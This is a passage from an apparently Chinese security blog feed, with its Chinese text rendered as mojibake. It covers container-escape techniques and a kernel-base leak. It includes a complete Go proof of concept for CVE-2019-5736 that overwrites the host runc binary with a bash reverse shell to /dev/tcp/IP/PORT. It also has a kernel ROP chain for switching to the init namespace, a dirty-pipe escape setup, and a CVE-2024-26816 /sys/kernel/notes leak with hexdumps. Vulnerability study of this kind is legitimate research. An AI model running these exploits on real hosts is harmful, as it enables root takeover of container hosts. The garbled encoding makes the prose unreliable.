<h4 id="runc"><a href="#runc" class="headerlink" title="runc"></a>runc</h4><p>runcæ˜¯ä¸€ä¸ªåº•å±‚æœåŠ¡å·¥å…·ï¼ŒrunC ç®¡ç†å®¹å™¨çš„åˆ›å»ºï¼Œè¿è¡Œï¼Œé”€æ¯ç­‰ï¼Œdockeréƒ¨åˆ†ç‰ˆæœ¬æœåŠ¡è¿è¡Œæ—¶åº•å±‚å…¶å®åœ¨è¿è¡Œç€runcæœåŠ¡ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„å®¹å™¨é•œåƒæˆ–è€…execæ“ä½œé‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä¸€ä¸ªå®¹å™¨å¼€å¯æ—¶ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥</p>
<ul>
<li>fork åˆ›å»ºå­è¿›ç¨‹</li>
<li>åˆå§‹åŒ–å®¹å™¨åŒ–ç¯å¢ƒ</li>
<li>å°†æ‰§è¡Œæµé‡å®šå‘åˆ°ç”¨æˆ·æä¾›çš„å…¥å£ç‚¹</li>
</ul>
<p><code>docker run</code>ç­‰å‘½ä»¤çš„æ—¶å€™å®é™…ä¸Šåœ¨åº•å±‚è°ƒç”¨çš„æ˜¯runCç¨‹åºï¼Œæˆ‘ä»¬åœ¨å®¹å™¨ä¸­è¿è¡Œ <code>/bin/bash</code> ä¹Ÿä¼šè°ƒç”¨åˆ°runC</p>
<p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0" alt="runc"></p>
<p>procfs:</p>
<ul>
<li><code>/proc/[PID]/exe</code>: ä¸€ç§ç‰¹æ®Šçš„è½¯è¿æ¥ï¼Œæ˜¯è¯¥è¿›ç¨‹è‡ªèº«å¯¹åº”çš„æœ¬åœ°æ–‡ä»¶</li>
<li><code>/proc/[PID]/fd/</code>: è¿™ä¸ªç›®å½•ä¸‹å­˜æ”¾äº†è¯¥è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦</li>
</ul>
<p><code>/proc/[PID]/exe</code>çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºå½“æƒé™é€šè¿‡çš„æƒ…å†µä¸‹æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸å°†ä¼šä¹‹é—´è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶éæŒ‰ç…§ä¼ ç»Ÿçš„æ‰“å¼€æ–¹å¼åšè·¯å¾„åˆ†æå’Œæ–‡ä»¶æŸ¥æ‰¾ï¼Œè¿™å°±ä¼šå¯¼è‡´ç»•è¿‡äº†mntå‘½åç©ºé—´å’Œchrootçš„é™åˆ¶ã€‚</p>
<p>CVE-2019-5736ï¼šè¯¥æ¼æ´å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<ul>
<li>ä¿®æ”¹å®¹å™¨å†…çš„<code>/bin/sh</code>æ–‡ä»¶ï¼Œæ”¹ä¸º<code>#!/proc/self/exe</code>ï¼Œè¿™æ ·çš„è¯ï¼Œå½“å®¹å™¨å†…çš„<code>/bin/sh</code>è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå®é™…ä¸Šè¢«æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„æ˜¯<code>/proc/self/exe</code></li>
<li><code>/proc/self/exe</code>æ˜¯å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºçš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘<strong>ä¸ºè¯¥è¿›ç¨‹è€Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚å½“å®¹å™¨ä¸­çš„<code>/bin/sh</code>è¢«æ‰§è¡Œæ—¶ï¼Œ<code>/proc/self/exe</code>æŒ‡å‘çš„å®¿ä¸»æœºä¸Šçš„<code>runc</code>å°±ä¼šè¢«æ‰§è¡Œ</li>
</ul>
<p>æ¼æ´çš„å­˜åœ¨åŸç†åœ¨äº&#x2F;proc&#x2F;pid&#x2F;exeè¿™ä¸ªç»‘å®šçš„æ–¹å¼ï¼Œ&#x2F;procæ˜¯æ¯”è¾ƒç†ŸçŸ¥çš„ä¸€ä¸ªæ¦‚å¿µï¼Œä¸ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä¸­çš„æ–‡ä»¶èƒ½å¤Ÿæ˜¾ç¤ºå½“å‰çš„è¿›ç¨‹è¿è¡Œä¿¡æ¯ã€‚&#x2F;proc&#x2F;pid&#x2F;exeæ˜¯ä¸€ä¸ªç¨‹åºé“¾æ¥ï¼ŒæŒ‡å‘è¿™ä¸ªpidè¿è¡Œçš„ç¨‹åºã€‚</p>
<p>è€Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼å°±åœ¨äºï¼Œåœ¨dockeré‡ŒæŸ¥æ‰¾åˆ°runcçš„exeï¼Œè·å–å¯¹åº”äºè¯¥ä½ç½®çš„ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œç„¶åå‘è¿™ä¸ªä½ç½®å†™å…¥ä¸œè¥¿çš„è¯ï¼Œå°±èƒ½å¤Ÿå°†å®¿ä¸»æœºçš„ç¨‹åºè¦†ç›–æ‰ï¼Œç„¶åç”¨æˆ·ä¸‹ä¸€æ¬¡å†è¦è¿è¡Œruncçš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘åå¼¹shellã€‚</p>
<p>PoC</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">// æ›¿æ¢IP å’Œ PORT</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//é¦–å…ˆæ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‰“å¼€/bin/shï¼Œå³æœ‰rootæƒé™å°±æˆ</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ç„¶åå°†å…¶è¦†ç›–ä¸º#!/proc/self/exe</span></span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// å¾ªç¯éå†/procé‡Œçš„æ–‡ä»¶ï¼Œç›´åˆ°æ‰¾åˆ°runcæ˜¯å“ªä¸ªè¿›ç¨‹</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// å¾ªç¯å»è¯»è¿™ä¸ª/proc/pid/exeï¼Œå…ˆæ‹¿åˆ°ä¸€ä¸ªè¯¥æ–‡ä»¶çš„fdï¼Œè¯¥fdå°±æŒ‡å‘äº†runcç¨‹åºçš„ä½ç½®</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ç„¶åä¸æ–­çš„å»å°è¯•å†™è¿™ä¸ªæŒ‡å‘çš„æ–‡ä»¶ï¼Œä¸€å¼€å§‹ç”±äºruncä¼šå…ˆå ç”¨ç€ï¼Œå†™ä¸è¿›å»ï¼Œç›´åˆ°runcçš„å ç”¨è§£é™¤äº†ï¼Œå°±ç«‹å³å†™å…¥</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>CVE-2024-21626ï¼šç”±äºÂ <code>runc</code>Â å†…éƒ¨ä¸æ­£ç¡®å¤„ç†æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¼è‡´æ³„æ¼å…³é”®çš„å®¿ä¸»æœºæ–‡ä»¶æè¿°ç¬¦åˆ°å®¹å™¨ä¸­ã€‚</p>
<p>è¿‘æ—¥å¤§ç«çš„CVEï¼Œåœ¨ç¿»çœ‹<a href="https://bestwing.me/CVE-2024-21626-container-escape.html">è¿™ä½å¸ˆå‚…çš„æ–‡ç« </a>æ—¶çœ‹åˆ°çš„</p>
<p><del>çœ‹èµ·æ¥å¾ˆNBï¼Œè™½ç„¶æˆ‘ç°åœ¨çœ‹ä¸æ‡‚ğŸ˜­</del></p>
<h4 id="containerd"><a href="#containerd" class="headerlink" title="containerd"></a>containerd</h4><p>containerd æ˜¯ä¸€ä¸ªå·¥ä¸šçº§æ ‡å‡†çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå®ƒå¼ºè°ƒ<strong>ç®€å•æ€§</strong>ã€<strong>å¥å£®æ€§</strong>å’Œ<strong>å¯ç§»æ¤æ€§</strong>ï¼Œcontainerd å¯ä»¥è´Ÿè´£å¹²ä¸‹é¢è¿™äº›äº‹æƒ…ï¼š</p>
<ul>
<li>ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä»åˆ›å»ºå®¹å™¨åˆ°é”€æ¯å®¹å™¨ï¼‰</li>
<li>æ‹‰å–&#x2F;æ¨é€å®¹å™¨é•œåƒ</li>
<li>å­˜å‚¨ç®¡ç†ï¼ˆç®¡ç†é•œåƒåŠå®¹å™¨æ•°æ®çš„å­˜å‚¨ï¼‰</li>
<li>è°ƒç”¨ runc è¿è¡Œå®¹å™¨ï¼ˆä¸ runc ç­‰å®¹å™¨è¿è¡Œæ—¶äº¤äº’ï¼‰</li>
<li>ç®¡ç†å®¹å™¨ç½‘ç»œæ¥å£åŠç½‘ç»œ</li>
</ul>
<h3 id="å†…æ ¸æ¼æ´"><a href="#å†…æ ¸æ¼æ´" class="headerlink" title="å†…æ ¸æ¼æ´"></a>å†…æ ¸æ¼æ´</h3><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>commit_creds(prepare_kernel_cred(0))ä¸ä¼šçªç ´namespaceå¯¹äºè¿›ç¨‹çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿åœ¨å®Œæˆææƒä¹‹åï¼Œtask_structä¸­çš„fs_structæˆ–è€…æ˜¯ns_proxyéƒ½ä¸å—åˆ°å½±å“è¿˜å¤„äºåŸæœ¬çš„å‘½åç©ºé—´ä¸­ã€‚</p>
<p>å¯ä»¥çœ‹CVE-2021-22555çš„æ¼æ´åˆ©ç”¨ï¼Œåœ¨å¾—åˆ°rootæƒé™åï¼Œéœ€è¦åœ¨å†…æ ¸ä¸­å°†è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºåˆå§‹çš„å…¨å±€å‘½åç©ºé—´Â <code>init_nsproxy</code>Â å³å¯å®Œæˆå®¹å™¨é€ƒé€¸ï¼Œæ‰§è¡Œ<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code>Â å³å¯æ›¿æ¢æ‰å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span></span><br><span class="line">  *rop++ = kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ = <span class="number">1</span>; <span class="comment">// RDI</span></span><br><span class="line">  *rop++ = kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ = kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ = <span class="number">4</span>; <span class="comment">// RCX</span></span><br><span class="line">  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ = <span class="number">0xDEADBEEF</span>; <span class="comment">// RBP</span></span><br><span class="line">  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ = kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ = kbase_addr + INIT_NSPROXY; <span class="comment">// RSI</span></span><br><span class="line">  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;</span><br></pre></td></tr></table></figure>

<h4 id="dirty-pipe"><a href="#dirty-pipe" class="headerlink" title="dirty pipe"></a>dirty pipe</h4><p>é€šè¿‡åˆ©ç”¨Â <code>CAP_DAC_READ_SEARCH</code>Â ä¸è„ç®¡é“å¯ä»¥å®ç°è¦†ç›–ä¸»æœºæ–‡ä»¶ï¼Œå®é™…ä¸Šä¸»è¦æ˜¯<code>CAP_DAC_READ_SEARCH</code>å¯ä»¥è°ƒç”¨<code>open_by_handle_at</code>, å¯ä»¥è·å¾—ä¸»æœºæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé…åˆè„ç®¡é“äºæ˜¯å°±å¯ä»¥ä¿®æ”¹ä¸»æœºæ–‡ä»¶ã€‚ä½†æ˜¯éœ€è¦æ·»åŠ capæƒé™ <a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=CAP_DAC_READ_SEARCH ubuntu</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://wiki.teamssix.com/CloudNative/">äº‘åŸç”Ÿ | T Wiki (teamssix.com)</a></li>
<li><a href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>ELFNote-leak-kernel-base</title>
    <url>/2024/04/15/ELFNote%20leak%20kernel%20base/</url>
    <content><![CDATA[<blockquote>
<p>CVE-2024-26816</p>
</blockquote>
<span id="more"></span>

<p>è¯»å– <code>/sys/kernel/notes</code> å†…å®¹æ¥è¿›è¡Œæ³„éœ² <code>startup_xen</code> çš„å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo grep startup_xen /proc/kallsyms</span><br><span class="line">ffffffff9fa94430 T startup_xen</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/kernel/notes     </span><br><span class="line">-r--r--r-- 1 root root 472 Apr 15 12:15 /sys/kernel/notes</span><br><span class="line"></span><br><span class="line">$ hexdump -C /sys/kernel/notes                                </span><br><span class="line">00000000  04 00 00 00 14 00 00 00  03 00 00 00 47 4e 55 00  |............GNU.|</span><br><span class="line">00000010  14 ef 14 05 a3 aa ad c2  53 c3 cc 95 80 be 45 a7  |........S.....E.|</span><br><span class="line">00000020  96 1f b5 51 06 00 00 00  04 00 00 00 01 01 00 00  |...Q............|</span><br><span class="line">00000030  4c 69 6e 75 78 00 00 00  00 00 00 00 06 00 00 00  |Linux...........|</span><br><span class="line">00000040  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|</span><br><span class="line">00000050  00 00 00 00 04 00 00 00  08 00 00 00 12 00 00 00  |................|</span><br><span class="line">00000060  58 65 6e 00 00 00 40 1d  00 00 00 00 04 00 00 00  |Xen...@.........|</span><br><span class="line">00000070  06 00 00 00 06 00 00 00  58 65 6e 00 6c 69 6e 75  |........Xen.linu|</span><br><span class="line">00000080  78 00 00 00 04 00 00 00  04 00 00 00 07 00 00 00  |x...............|</span><br><span class="line">00000090  58 65 6e 00 32 2e 36 00  04 00 00 00 08 00 00 00  |Xen.2.6.........|</span><br><span class="line">000000a0  05 00 00 00 58 65 6e 00  78 65 6e 2d 33 2e 30 00  |....Xen.xen-3.0.|</span><br><span class="line">000000b0  04 00 00 00 08 00 00 00  03 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000c0  00 00 00 80 ff ff ff ff  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000000d0  0f 00 00 00 58 65 6e 00  00 00 00 00 80 00 00 00  |....Xen.........|</span><br><span class="line">000000e0  04 00 00 00 08 00 00 00  01 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000f0  30 44 a9 9f ff ff ff ff  04 00 00 00 15 00 00 00  |0D..............|</span><br><span class="line">00000100  0a 00 00 00 58 65 6e 00  21 77 72 69 74 61 62 6c  |....Xen.!writabl|</span><br><span class="line">00000110  65 5f 70 61 67 65 5f 74  61 62 6c 65 73 00 00 00  |e_page_tables...|</span><br><span class="line">00000120  04 00 00 00 04 00 00 00  09 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000130  79 65 73 00 04 00 00 00  10 00 00 00 0d 00 00 00  |<span class="built_in">yes</span>.............|</span><br><span class="line">00000140  58 65 6e 00 01 00 00 00  00 00 00 00 01 00 00 00  |Xen.............|</span><br><span class="line">00000150  00 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|</span><br><span class="line">00000170  04 00 00 00 58 65 6e 00  00 00 00 00 00 00 00 00  |....Xen.........|</span><br><span class="line">00000180  04 00 00 00 08 00 00 00  02 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000190  00 00 54 9e ff ff ff ff  04 00 00 00 04 00 00 00  |..T.............|</span><br><span class="line">000001a0  11 00 00 00 58 65 6e 00  01 88 00 00 04 00 00 00  |....Xen.........|</span><br><span class="line">000001b0  08 00 00 00 08 00 00 00  58 65 6e 00 67 65 6e 65  |........Xen.gene|</span><br><span class="line">000001c0  72 69 63 00 04 00 00 00  04 00 00 00 0e 00 00 00  |ric.............|</span><br><span class="line">000001d0  58 65 6e 00 01 00 00 00                           |Xen.....|</span><br><span class="line">000001d8</span><br></pre></td></tr></table></figure>


<p><code>arch/x86/xen/xen-head.S</code> å®šä¹‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> XEN_ELFNOTE_ENTRY          1</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_OS,       .asciz <span class="string">&quot;linux&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_VERSION,  .asciz <span class="string">&quot;2.6&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_XEN_VERSION,    .asciz <span class="string">&quot;xen-3.0&quot;</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line">	<span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_INIT_P2M,       .<span class="built_in">quad</span> (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">		.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>ELFNOTE:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a structure with the same shape as Elf&#123;32,64&#125;_Nhdr (which</span></span><br><span class="line"><span class="comment"> * turn out to be the same size and shape), followed by the name and</span></span><br><span class="line"><span class="comment"> * desc data with appropriate padding.  The &#x27;desctype&#x27; argument is the</span></span><br><span class="line"><span class="comment"> * assembler pseudo op defining the type of the data e.g. .asciz while</span></span><br><span class="line"><span class="comment"> * &#x27;descdata&#x27; is the data itself e.g.  &quot;hello, world&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * e.g. ELFNOTE(XYZCo, 42, .asciz, &quot;forty-two&quot;)</span></span><br><span class="line"><span class="comment"> *      ELFNOTE(XYZCo, 12, .long, 0xdeadbeef)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_START(name, type, flags)	\</span></span><br><span class="line"><span class="meta">.pushsection .note.name, flags,@note	;	\</span></span><br><span class="line"><span class="meta">  .balign 4				;	\</span></span><br><span class="line"><span class="meta">  .long 2f - 1f		<span class="comment">/* namesz */</span>	;	\</span></span><br><span class="line"><span class="meta">  .long 4484f - 3f	<span class="comment">/* descsz */</span>	;	\</span></span><br><span class="line"><span class="meta">  .long type				;	\</span></span><br><span class="line"><span class="meta">1:.asciz #name				;	\</span></span><br><span class="line"><span class="meta">2:.balign 4				;	\</span></span><br><span class="line"><span class="meta">3:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_END				\</span></span><br><span class="line"><span class="meta">4484:.balign 4				;	\</span></span><br><span class="line"><span class="meta">.popsection				;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE(name, type, desc)		\</span></span><br><span class="line"><span class="meta">	ELFNOTE_START(name, type, <span class="string">&quot;a&quot;</span>)		\</span></span><br><span class="line"><span class="meta">		desc			;	\</span></span><br><span class="line"><span class="meta">	ELFNOTE_END</span></span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ <code>CONFIG_XEN_PV=y</code> è¿™ä¸€é€‰é¡¹ï¼Œä¼šå†™å…¥ <code>startup_xen</code> çš„å†…å®¹ã€‚\</p>
<ul>
<li>type: <code>1</code></li>
<li>name: <code>Xen</code></li>
</ul>
<p>Notes (Nhdr)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf32_Word n_namesz;</span><br><span class="line">   Elf32_Word n_descsz;</span><br><span class="line">   Elf32_Word n_type;</span><br><span class="line">&#125; Elf32_Nhdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf64_Word n_namesz;</span><br><span class="line">   Elf64_Word n_descsz;</span><br><span class="line">   Elf64_Word n_type;</span><br><span class="line">&#125; Elf64_Nhdr;</span><br></pre></td></tr></table></figure>

<p>å…¶ç»“æ„</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Nhdr</span><br><span class="line">name</span><br><span class="line">desc</span><br></pre></td></tr></table></figure>


<p>å·²ç»è¢«patchï¼Œç­‰å¾…è¿›å…¥ä¸»çº¿</p>
<ul>
<li><a href="https://lore.kernel.org/linux-hardening/202402180028.6DB512C50@keescook/">Re: [RESEND RFC] kernel&#x2F;ksysfs.c: restrict &#x2F;sys&#x2F;kernel&#x2F;notes to root access - Kees Cook</a></li>
</ul>
<p>è¿™ä¸ªé—®é¢˜è¢«å¼•å…¥æ—¶ï¼ŒKASLRè¿˜æ²¡æœ‰å‡ºç°ğŸ¤£</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://github.com/advisories/GHSA-mw3g-jr7f-3gg4">CVE-2024-26816 Â· GitHub Advisory Database</a></li>
<li><a href="https://lwn.net/Articles/962782/">When ELF notes reveal too much [LWN.net]</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>DubheCTF-ggbond</title>
    <url>/2024/03/20/DubheCTF%20ggbond/</url>
    <content><![CDATA[<blockquote>
<p>golang pwn</p>
</blockquote>
<span id="more"></span>

